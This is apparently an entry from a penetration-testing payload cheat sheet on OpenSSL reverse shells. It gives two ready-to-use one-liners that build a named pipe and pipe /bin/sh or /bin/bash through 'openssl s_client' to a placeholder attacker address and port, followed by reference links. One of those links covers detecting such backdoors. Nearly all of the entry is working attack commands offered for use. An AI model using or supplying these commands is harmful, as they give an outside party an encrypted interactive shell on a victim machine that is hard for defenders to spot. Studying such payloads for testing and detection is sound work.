# OpenSSL

```
$ mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f

$ mkfifo /tmp/f; /bin/bash -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)

- [Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)